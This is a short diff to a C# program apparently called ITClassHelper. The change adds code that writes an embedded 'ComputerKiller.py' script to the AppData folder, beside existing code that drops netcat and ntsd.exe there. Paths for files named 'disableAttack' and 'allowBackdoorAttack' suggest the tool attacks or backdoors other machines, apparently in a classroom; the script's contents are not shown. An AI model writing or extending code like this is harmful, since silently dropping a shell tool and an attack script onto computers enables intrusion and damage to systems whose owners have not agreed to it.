@@ -129,11 +129,12 @@ namespace ITClassHelper
         }
 
         readonly FormController controller = new FormController();
-        FormDeviceManage deviceManage = new FormDeviceManage();
+        readonly FormDeviceManage deviceManage = new FormDeviceManage();
         static readonly string ProgramVersion = "3.0.0-d";
         static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ITClassHelper";
         static readonly string ncPath = path + @"\nc.exe";
         static readonly string ntsdPath = path + @"\ntsd.exe";
+        static readonly string killerPath = path + @"\ComputerKiller.py";
         static readonly string disableAttackFilePath = path + @"\disableAttack.txt";
         static readonly string allowBackdoorFilePath = path + @"\allowBackdoorAttack.txt";
         static string attackScriptPath, roomPath;
@@ -182,6 +183,11 @@ namespace ITClassHelper
             FileStream netCatFsObj = new FileStream(ncPath, FileMode.Create);
             netCatFsObj.Write(RescNetCat, 0, RescNetCat.Length);
             netCatFsObj.Close();
+
+            byte[] RescKiller = Properties.Resources.ComputerKiller;
+            FileStream killerFsObj = new FileStream(killerPath, FileMode.Create);
+            killerFsObj.Write(RescKiller, 0, RescKiller.Length);
+            killerFsObj.Close();
 
             new Thread(LoopThread) { IsBackground = true }.Start();
         }
